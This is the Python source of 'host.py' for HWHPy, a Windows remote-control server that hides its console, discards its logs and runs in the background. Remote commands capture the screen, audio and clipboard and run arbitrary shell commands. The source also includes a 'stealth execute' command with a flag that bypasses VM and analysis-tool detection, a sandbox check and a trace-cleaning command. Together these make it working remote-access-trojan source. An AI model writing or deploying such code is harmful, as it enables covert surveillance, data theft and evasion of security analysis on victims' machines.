"""
host.py - HWHPy Remote Host
hwh-dsc.gg/hwhclient

Runs completely in the background (Background Processes in Task Manager).
Shows a one-time popup with the connection code, then runs silently.
"""

import socket
import threading
import base64
import json
import os
import sys
import ctypes
import subprocess
import logging
import time
from io import BytesIO
from datetime import datetime

import psutil
import pyperclip
import imageio_ffmpeg                        # bundles ffmpeg — no separate install needed
from PIL import Image, ImageDraw, ImageGrab
import shutil

# ── Silent Executor (from Main.py) ───────────────────────────────────────────
try:
    from Main import SilentExecutor
    _silent_executor = SilentExecutor()
except Exception as e:
    _silent_executor = None

# ── Hide console window immediately ──────────────────────────────────────────
def _hide_console() -> None:
    """Hide the Windows console window as soon as the script starts."""
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0

_hide_console()

# ── Privacy: do not persist addresses, commands, or connection codes ─────────
log = logging.getLogger("host")
log.addHandler(logging.NullHandler())
log.propagate = False

# ── Configuration ─────────────────────────────────────────────────────────────
HOST_IP      = "0.0.0.0"
HOST_PORT    = 0          # 0 = OS picks a free port
BACKLOG      = 5
HOSTS_FILE   = r"C:\Windows\System32\drivers\etc\hosts"
BLOCK_MARKER = "# [SH]"
SAVE_DIR     = os.path.dirname(os.path.abspath(__file__))


# ── Length-prefixed protocol (4-byte big-endian header + JSON body) ───────────
def _recvall(sock: socket.socket, n: int) -> bytes | None:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def send_msg(sock: socket.socket, payload: dict) -> None:
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    sock.sendall(len(data).to_bytes(4, "big") + data)


def recv_msg(sock: socket.socket) -> dict | None:
    raw_len = _recvall(sock, 4)
    if raw_len is None:
        return None
    n = int.from_bytes(raw_len, "big")
    raw = _recvall(sock, n)
    if raw is None:
        return None
    return json.loads(raw.decode("utf-8"))


# ── Helpers ───────────────────────────────────────────────────────────────────
def get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def build_code(ip: str, port: int) -> str:
    """Encode ip:port as a URL-safe base64 string (the connection code)."""
    return base64.urlsafe_b64encode(f"{ip}:{port}".encode()).decode().rstrip("=")


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


# ── Recording state ───────────────────────────────────────────────────────────
_record_lock  = threading.Lock()
_record_state: dict = {
    "active":   False,
    "process":  None,   # the ffmpeg subprocess
    "filename": None,
}

# Bundled ffmpeg binary (ships with imageio-ffmpeg, no extra install needed)
_FFMPEG = imageio_ffmpeg.get_ffmpeg_exe()


def _screen_size() -> tuple[int, int]:
    """Return the full virtual desktop width x height in pixels."""
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    return user32.GetSystemMetrics(78), user32.GetSystemMetrics(79)


def _build_ffmpeg_cmd(filename: str, fps: int = 30, crf: int = 0) -> list[str]:
    """
    ffmpeg command inspired by Green Recorder:
      - Input:  gdigrab  (Windows OS-level desktop capture)
      - Video:  libx264  lossless (crf=0) or near-lossless
      - Audio:  dshow microphone (optional, graceful fallback)
      - Output: MP4

    crf=0  -> truly lossless H.264 (best quality, larger files)
    crf=18 -> visually lossless (good balance for long sessions)
    """
    return [
        _FFMPEG,
        "-loglevel", "error",
        "-f",         "gdigrab",
        "-framerate", str(fps),
        "-draw_mouse","1",
        "-i",         "desktop",
        "-f",         "dshow",
        "-i",         "audio=virtual-audio-capturer",
        "-c:v",  "libx264",
        "-preset","ultrafast",
        "-crf",  str(crf),
        "-pix_fmt","yuv420p",
        "-c:a",  "aac",
        "-b:a",  "192k",
        filename, "-y",
    ]


def _build_ffmpeg_cmd_noaudio(filename: str, fps: int = 30, crf: int = 0) -> list[str]:
    """Same as above but without audio input (fallback when no audio device found)."""
    return [
        _FFMPEG,
        "-loglevel", "error",
        "-f",         "gdigrab",
        "-framerate", str(fps),
        "-draw_mouse","1",
        "-i",         "desktop",
        "-c:v",  "libx264",
        "-preset","ultrafast",
        "-crf",  str(crf),
        "-pix_fmt","yuv420p",
        filename, "-y",
    ]


# ── Commands ──────────────────────────────────────────────────────────────────

def cmd_record(args: list) -> dict:
    """
    Start or stop screen recording using ffmpeg (Green Recorder approach).

    /record start [fps] [crf]
        fps  - frames per second  (default 30, max 60)
        crf  - quality 0=lossless ... 51=low  (default 0)

    /record stop
        Stops ffmpeg gracefully and finalises the MP4.
    """
    if not args:
        return {"ok": False, "msg": "Usage: /record start [fps] [crf]  |  /record stop"}

    action = args[0].lower()

    with _record_lock:
        if action == "start":
            if _record_state["active"]:
                return {"ok": False, "msg": "A recording is already running. Use /record stop first."}

            fps = int(args[1]) if len(args) > 1 and args[1].isdigit() else 30
            crf = int(args[2]) if len(args) > 2 and args[2].isdigit() else 0
            fps = max(1, min(fps, 60))
            crf = max(0, min(crf, 51))

            ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(SAVE_DIR, f"recording_{ts}.mp4")

            # Try with audio first; fall back to video-only if dshow fails
            try:
                cmd  = _build_ffmpeg_cmd(filename, fps=fps, crf=crf)
                proc = subprocess.Popen(
                    cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                time.sleep(1.0)
                if proc.poll() is not None:
                    raise RuntimeError("audio device unavailable")
                audio_note = "with audio"
            except Exception:
                cmd  = _build_ffmpeg_cmd_noaudio(filename, fps=fps, crf=crf)
                proc = subprocess.Popen(
                    cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                audio_note = "video only (no audio device)"

            _record_state.update(active=True, process=proc, filename=filename)
            w, h = _screen_size()
            log.info(f"Recording started -> {filename}  ({w}x{h} @ {fps}fps crf={crf} {audio_note})")
            return {
                "ok": True,
                "msg": (
                    f"Recording started ({audio_note}).\n"
                    f"Resolution : {w}x{h}\n"
                    f"FPS        : {fps}\n"
                    f"Quality    : {'lossless (crf=0)' if crf == 0 else f'crf={crf}'}\n"
                    f"Saving to  : {filename}"
                ),
            }

        elif action == "stop":
            if not _record_state["active"]:
                return {"ok": False, "msg": "No recording is currently running."}

            proc: subprocess.Popen = _record_state["process"]
            try:
                proc.stdin.write(b"q")
                proc.stdin.flush()
                proc.wait(timeout=15)
            except Exception:
                proc.kill()

            _record_state["active"] = False
            fn = _record_state["filename"]
            try:
                size_mb = os.path.getsize(fn) / (1024 * 1024)
                log.info(f"Recording saved -> {fn}  ({size_mb:.1f} MB)")
                return {"ok": True, "msg": f"Recording saved.\nFile : {fn}\nSize : {size_mb:.1f} MB"}
            except OSError:
                return {"ok": True, "msg": f"Recording saved: {fn}"}

        else:
            return {"ok": False, "msg": f"Unknown action '{action}'. Use: /record start | /record stop"}


def cmd_kill(args: list) -> dict:
    if not args:
        return {"ok": False, "msg": "Usage: /kill <process.exe>"}
    target = args[0].lower()
    killed, not_found = [], True
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if proc.info["name"].lower() == target:
                not_found = False
                proc.kill()
                killed.append(proc.info["pid"])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    if not_found:
        return {"ok": False, "msg": f"No process named '{target}' found."}
    return {"ok": True, "msg": f"Process killed. PIDs: {killed}"}


def cmd_list(_: list) -> dict:
    names = sorted(
        {p.info["name"] for p in psutil.process_iter(["name"]) if p.info["name"]}
    )
    return {"ok": True, "msg": "\n".join(names)}


def cmd_tasklist(_: list) -> dict:
    rows = []
    for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info"]):
        try:
            mem_mb = (p.info["memory_info"].rss // (1024 * 1024)) if p.info["memory_info"] else 0
            rows.append(
                f"{p.info['pid']:6}  {p.info['name']:<35} {p.info['cpu_percent']:5.1f}%  {mem_mb} MB"
            )
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    header = f"{'PID':>6}  {'NAME':<35} {'CPU%':>5}   RAM\n" + "-" * 62
    return {"ok": True, "msg": header + "\n" + "\n".join(rows)}


def cmd_screenshot(_: list) -> dict:
    try:
        img = ImageGrab.grab(all_screens=True)
        buf = BytesIO()
        img.save(buf, format="PNG", optimize=True)
        encoded = base64.b64encode(buf.getvalue()).decode()
        return {"ok": True, "msg": "Screenshot captured.", "image_b64": encoded}
    except Exception as e:
        return {"ok": False, "msg": f"Screenshot failed: {e}"}


def cmd_block(args: list) -> dict:
    if not args:
        return {"ok": False, "msg": "Usage: /block <domain>"}
    domain = args[0].lower().strip()
    if not is_admin():
        return {"ok": False, "msg": "Administrator privileges required. Run host.py as Administrator."}
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        if domain in content:
            return {"ok": False, "msg": f"'{domain}' is already blocked."}
        entry = f"\n127.0.0.1 {domain} {BLOCK_MARKER}\n127.0.0.1 www.{domain} {BLOCK_MARKER}\n"
        with open(HOSTS_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        log.info(f"Blocked: {domain}")
        return {"ok": True, "msg": f"'{domain}' has been blocked."}
    except PermissionError:
        return {"ok": False, "msg": "Permission denied. Run host.py as Administrator."}
    except Exception as e:
        return {"ok": False, "msg": f"Error: {e}"}


def cmd_unblock(args: list) -> dict:
    if not args:
        return {"ok": False, "msg": "Usage: /unblock <domain>"}
    domain = args[0].lower().strip()
    if not is_admin():
        return {"ok": False, "msg": "Administrator privileges required."}
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
        new_lines = [l for l in lines if not (domain in l and BLOCK_MARKER in l)]
        if len(new_lines) == len(lines):
            return {"ok": False, "msg": f"'{domain}' is not blocked."}
        with open(HOSTS_FILE, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
        log.info(f"Unblocked: {domain}")
        return {"ok": True, "msg": f"'{domain}' has been unblocked."}
    except PermissionError:
        return {"ok": False, "msg": "Permission denied. Run host.py as Administrator."}
    except Exception as e:
        return {"ok": False, "msg": f"Error: {e}"}


def cmd_blocked(_: list) -> dict:
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
        seen, unique = set(), []
        for l in lines:
            if BLOCK_MARKER in l:
                parts = l.strip().split()
                if len(parts) >= 2 and parts[1] not in seen:
                    seen.add(parts[1])
                    unique.append(parts[1])
        if not unique:
            return {"ok": True, "msg": "No websites are currently blocked."}
        return {"ok": True, "msg": "Blocked websites:\n" + "\n".join(f"  * {d}" for d in unique)}
    except Exception as e:
        return {"ok": False, "msg": f"Error: {e}"}


def cmd_lockscreen(_: list) -> dict:
    try:
        ctypes.windll.user32.LockWorkStation()
        return {"ok": True, "msg": "Screen locked."}
    except Exception as e:
        return {"ok": False, "msg": f"Lock failed: {e}"}


def cmd_msgbox(args: list) -> dict:
    if not args:
        return {"ok": False, "msg": "Usage: /msgbox <message>"}
    message = " ".join(args)
    threading.Thread(
        target=lambda: ctypes.windll.user32.MessageBoxW(0, message, "HWHPy", 0x30),
        daemon=True,
    ).start()
    log.info(f"Message shown: {message!r}")
    return {"ok": True, "msg": f"Message displayed on host: '{message}'"}


def cmd_clipboard(_: list) -> dict:
    try:
        content = pyperclip.paste()
        return {"ok": True, "msg": f"Host clipboard:\n{content}" if content else "(Clipboard is empty)"}
    except Exception as e:
        return {"ok": False, "msg": f"Error: {e}"}


def cmd_poweroff(_: list) -> dict:
    subprocess.run(["shutdown", "/s", "/t", "10"])
    return {"ok": True, "msg": "Host PC will shut down in 10 seconds."}


def cmd_restart(_: list) -> dict:
    subprocess.run(["shutdown", "/r", "/t", "10"])
    return {"ok": True, "msg": "Host PC will restart in 10 seconds."}


def cmd_cancelshutdown(_: list) -> dict:
    result = subprocess.run(["shutdown", "/a"], capture_output=True)
    if result.returncode == 0:
        return {"ok": True, "msg": "Pending shutdown cancelled."}
    return {"ok": False, "msg": "No pending shutdown to cancel."}


def cmd_openapp(args: list) -> dict:
    if not args:
        return {"ok": False, "msg": "Usage: /open <path or app name>"}
    raw_target = " ".join(args).strip().strip('"').strip("'")
    if _silent_executor:
        resolved = raw_target if os.path.exists(raw_target) else shutil.which(raw_target)
        if resolved:
            res = _silent_executor.execute_file(resolved, use_temp=False, verbose=False)
            return {"ok": res.get("ok", False), "msg": res.get("msg", "")}
    try:
        subprocess.Popen(raw_target, shell=True)
        return {"ok": True, "msg": f"Application launched: '{raw_target}'"}
    except Exception as e:
        return {"ok": False, "msg": f"Failed to launch '{raw_target}': {e}"}


def cmd_exec(args: list) -> dict:
    """
    Stealth execute a file using SilentExecutor.
    Usage: /exec <file_path> [--notemp] [--force]
      --notemp : do not create randomized temporary copy
      --force  : bypass environment/VM detection check
    """
    if not args:
        return {"ok": False, "msg": "Usage: /exec <file_path> [--notemp] [--force]"}
    
    clean_args = []
    use_temp = True
    bypass_env = False
    for a in args:
        if a.lower() == "--notemp":
            use_temp = False
        elif a.lower() == "--force":
            bypass_env = True
        else:
            clean_args.append(a)
            
    if not clean_args:
        return {"ok": False, "msg": "Usage: /exec <file_path> [--notemp] [--force]"}
        
    file_path = " ".join(clean_args).strip().strip('"').strip("'")
    if not _silent_executor:
        return {"ok": False, "msg": "SilentExecutor is not available on host."}
        
    res = _silent_executor.execute_file(file_path, use_temp=use_temp, bypass_env=bypass_env, verbose=False)
    return {"ok": res.get("ok", False), "msg": res.get("msg", "")}


def cmd_checkenv(_: list) -> dict:
    """Check host environment for virtual machine or analysis tool indicators"""
    if not _silent_executor:
        return {"ok": False, "msg": "SilentExecutor is not available on host."}
    indicators = _silent_executor.get_detected_indicators()
    if indicators:
        return {
            "ok": True,
            "msg": f"Analysis / VM environment detected!\nIndicators found: {', '.join(indicators)}"
        }
    return {"ok": True, "msg": "Clean environment: No VM or analysis indicators detected."}


def cmd_cleantraces(_: list) -> dict:
    """Clean temporary traces and temp execution artifacts from host"""
    if not _silent_executor:
        return {"ok": False, "msg": "SilentExecutor is not available on host."}
    cleaned = _silent_executor.cleanup_traces()
    return {"ok": True, "msg": f"Traces cleaned: {cleaned} temp file(s) removed from host."}


def cmd_netstat(_: list) -> dict:
    rows = []
    for conn in psutil.net_connections(kind="inet"):
        laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-"
        raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
        try:
            name = psutil.Process(conn.pid).name() if conn.pid else "-"
        except Exception:
            name = "-"
        rows.append(f"{laddr:<25} {raddr:<25} {conn.status:<12} {name} (PID {conn.pid or '-'})")
    header = f"{'LOCAL':<25} {'REMOTE':<25} {'STATUS':<12} PROCESS\n" + "-" * 80
    return {"ok": True, "msg": header + "\n" + "\n".join(rows)}


def cmd_help(_: list) -> dict:
    return {"ok": True, "msg": (
        "Available commands:\n"
        "\n"
        "  Processes & Execution:\n"
        "    /kill <process.exe>       Kill all instances of a process\n"
        "    /list                     List unique running process names\n"
        "    /tasklist                 Detailed list (PID, name, CPU%, RAM)\n"
        "    /open <app>               Launch an application on the host\n"
        "    /exec <path> [--notemp]   Stealth execute via SilentExecutor\n"
        "    /checkenv                 Check host for VM / analysis tools\n"
        "    /cleantraces              Remove temp execution artifacts\n"
        "\n"
        "  Screen:\n"
        "    /screenshot               Capture host screen -> saved as PNG\n"
        "    /record start [fps] [crf] Start screen recording (MP4, default 30fps lossless)\n"
        "    /record stop              Stop recording and save the file\n"
        "    /lockscreen               Lock the host screen\n"
        "    /msgbox <text>            Show a popup on the host screen\n"
        "\n"
        "  Network / Web:\n"
        "    /block <domain>           Block a website (requires admin)\n"
        "    /unblock <domain>         Unblock a website\n"
        "    /blocked                  Show currently blocked websites\n"
        "    /netstat                  Show active network connections\n"
        "\n"
        "  System:\n"
        "    /clipboard                Read host clipboard content\n"
        "    /poweroff                 Shut down host PC (in 10 s)\n"
        "    /restart                  Restart host PC (in 10 s)\n"
        "    /cancelshutdown           Cancel a pending shutdown/restart\n"
        "\n"
        "  Connection:\n"
        "    /help                     Show this message\n"
        "    /exit                     Disconnect receiver\n"
        "    /shutdown                 Close the host server"
    )}


# ── Command map ───────────────────────────────────────────────────────────────
COMMANDS: dict = {
    "/record":         cmd_record,
    "/kill":           cmd_kill,
    "/list":           cmd_list,
    "/tasklist":       cmd_tasklist,
    "/screenshot":     cmd_screenshot,
    "/block":          cmd_block,
    "/unblock":        cmd_unblock,
    "/blocked":        cmd_blocked,
    "/lockscreen":     cmd_lockscreen,
    "/msgbox":         cmd_msgbox,
    "/clipboard":      cmd_clipboard,
    "/poweroff":       cmd_poweroff,
    "/restart":        cmd_restart,
    "/cancelshutdown": cmd_cancelshutdown,
    "/open":           cmd_openapp,
    "/exec":           cmd_exec,
    "/execute":        cmd_exec,
    "/checkenv":       cmd_checkenv,
    "/cleantraces":    cmd_cleantraces,
    "/netstat":        cmd_netstat,
    "/help":           cmd_help,
}


# ── Client handler ────────────────────────────────────────────────────────────
def handle_client(conn: socket.socket, addr, shutdown_event: threading.Event) -> None:
    log.info(f"Receiver connected from {addr}")
    try:
        with conn:
            conn.settimeout(120)
            while not shutdown_event.is_set():
                try:
                    request = recv_msg(conn)
                except socket.timeout:
                    continue
                if request is None:
                    break

                cmd_str: str = request.get("cmd", "").strip()
                log.info(f"Command: {cmd_str!r}")
                parts = cmd_str.split()
                verb  = parts[0].lower() if parts else ""
                args  = parts[1:]

                if verb == "/exit":
                    send_msg(conn, {"ok": True, "msg": "Goodbye."})
                    break
                elif verb == "/shutdown":
                    send_msg(conn, {"ok": True, "msg": "Host server shutting down."})
                    shutdown_event.set()
                    break
                elif verb in COMMANDS:
                    try:
                        result = COMMANDS[verb](args)
                    except Exception as e:
                        result = {"ok": False, "msg": f"Internal error: {e}"}
                        log.exception(f"Error running {verb}")
                    send_msg(conn, result)
                else:
                    send_msg(conn, {
                        "ok":  False,
                        "msg": f"Unknown command '{verb}'. Type /help for the list."
                    })
    except Exception as e:
        log.error(f"Error with client {addr}: {e}")
    finally:
        log.info(f"Receiver {addr} disconnected.")


# ── TCP server thread ─────────────────────────────────────────────────────────
def server_thread(server: socket.socket, shutdown_event: threading.Event) -> None:
    server.settimeout(1.0)
    log.info("Server listening.")
    while not shutdown_event.is_set():
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except Exception:
            break
        threading.Thread(
            target=handle_client, args=(conn, addr, shutdown_event), daemon=True
        ).start()
    server.close()
    log.info("Server closed.")


# ── LAN auto-discovery (UDP broadcast beacon) ─────────────────────────────────
DISCOVERY_PORT     = 55556          # UDP port used for LAN discovery
DISCOVERY_INTERVAL = 2              # seconds between beacons


def _broadcast_presence(tcp_port: int, shutdown_event: threading.Event) -> None:
    """
    Sends a UDP broadcast every DISCOVERY_INTERVAL seconds so any receiver
    on the same LAN can detect this host automatically without a code.
    Packet format: JSON  {"service": "hwhpy", "port": <tcp_port>}
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    beacon = json.dumps({"service": "hwhpy", "port": tcp_port}).encode()
    log.info(f"Discovery beacon active on UDP:{DISCOVERY_PORT}")
    while not shutdown_event.is_set():
        try:
            sock.sendto(beacon, ("<broadcast>", DISCOVERY_PORT))
        except Exception as e:
            log.warning(f"Broadcast error: {e}")
        shutdown_event.wait(timeout=DISCOVERY_INTERVAL)
    sock.close()


# ── Entry point ───────────────────────────────────────────────────────────────
def main() -> None:
    shutdown_event = threading.Event()

    # Bind TCP server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST_IP, HOST_PORT))
    server.listen(BACKLOG)

    actual_port = server.getsockname()[1]
    local_ip    = get_local_ip()
    code        = build_code(local_ip, actual_port)

    try:
        pyperclip.copy(code)
    except Exception:
        pass

    log.info("HWHPy started")

    # Start TCP server in background
    threading.Thread(
        target=server_thread, args=(server, shutdown_event), daemon=True
    ).start()

    # Start UDP broadcast beacon in background (LAN auto-discovery)
    threading.Thread(
        target=_broadcast_presence, args=(actual_port, shutdown_event), daemon=True
    ).start()

    # One-time startup popup — shows the code, then disappears.
    # No window is left open -> process appears in Background Processes.
    ctypes.windll.user32.MessageBoxW(
        0,
        f"HWHPy — hwh-dsc.gg/hwhclient\n\nConnection code:\n\n{code}\n\n"
        f"(Code copied to clipboard)\n\n"
        f"Auto-discovery active — receiver.py will find this host\nautomatically on the same network.",
        "HWHPy",
        0x40,
    )

    # Block the main thread silently until /shutdown is received.
    shutdown_event.wait()

    # Clean up any active recording before exiting
    with _record_lock:
        if _record_state["active"]:
            proc = _record_state["process"]
            try:
                proc.stdin.write(b"q")
                proc.stdin.flush()
                proc.wait(timeout=10)
            except Exception:
                proc.kill()

    server.close()
    log.info("Stopped.")


if __name__ == "__main__":
    main()
